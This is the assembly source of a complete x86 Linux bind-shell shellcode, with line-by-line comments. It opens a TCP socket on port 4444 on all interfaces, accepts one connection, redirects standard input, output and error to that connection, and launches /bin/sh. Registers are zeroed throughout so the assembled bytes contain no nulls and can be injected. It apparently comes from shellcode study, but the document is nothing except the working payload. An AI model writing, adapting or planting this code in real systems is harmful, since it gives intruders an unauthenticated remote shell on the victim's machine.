
; Purpose: Open a bind port on the local computer

global _start			

section .text


_start:

	; Open a socket using socket syscall


	xor eax, eax
	mov ax, 0x167 ; socket syscall
	
	xor ebx, ebx  ; zero out registers to prevent nulls later
	xor ecx, ecx
	xor edx, edx

	mov bl, 0x2  ; 2 is for AF_INET / PF_INET protocol family
	mov cl, 0x1  ; 1 is for SOCK_STREAM type - refer net.h and socket.h, edx can stay 0 for protocol int
	
	int 0x80 ; call socket(2,1,0)
	

	; Bind the socket to a port using bind syscall
	; return value of socket call above is int sockfd which is in eax
	; ecx should point to struct sockaddr (AF_INET, Port num, inet_addr)

	mov ebx, eax ; move socket fd result into ebx

	xor eax, eax
	mov ax, 0x169 ; bind syscall

	mov ebp, esp		; set start of stack frame
	push edx
	push edx 			; push 8 bytes of padding (lines 36 + 37)
	push edx 			; INADDR to be 0.0.0.0
	push word 0x5c11 	; port 4444 in reverse hex
	push word 0x2		; 2 is the value for AF_INET
	mov ecx, esp 		; ecx now points to struct

	sub ebp, esp 		; store struct size in ebp i.e. stack frame size
	mov edx, ebp		; move struct size into edx

	int 0x80			; call bind syscall

	; setting up the bind port to listen

	xor eax, eax
	mov ax, 0x16b	; listen syscall
					; ebx still contains socket fd
	xor ecx, ecx	; backlog should be one because we want max one connection
	mov cl, 0x1

	int 0x80		; call listen syscall

	; setting up bind port to accept incoming connection

	xor eax, eax
	mov ax, 0x16c	; accept4 syscall
					; ebx still contains socket fd
	mov ecx, esp 	; ecx points to struct_in
	push edx
	mov edx, esp	; edx had struct size, now it points to the struct size
	xor esi, esi	; set int flags parameter to 0
	int 0x80		; accept4 syscall


	; duplicate new fd from accept syscall to redirect std_in, std_out, and std_error

	mov ebx, eax	; mov client fd into ebx
	xor ecx, ecx
	mov cl, 0x3

_dupfds: 	; loop through stdin, stdout, stderr and create three new fds

	xor eax, eax
	mov al, 0x3f	; syscall for dup2(oldfd, newfd)
	dec ecx
	int 0x80		; loop to create stdin,stdout,stderr fds
	jnz _dupfds	; dup syscall for each new fd


_execve:
	; call execve to create shell

	xor eax, eax	; reset registers to zero
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	mov al, 0xb		; execve syscall

	; push /bin//sh onto the stack

	push ebx			; put nulls on stack
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov ebx, esp		; pointer to filename of file to execute

	push edx
	mov edx, esp		; pointer to envp (null)

	push ebx
	mov ecx, esp		; pointer to argument array

	int 0x80			; syscall to execve

	

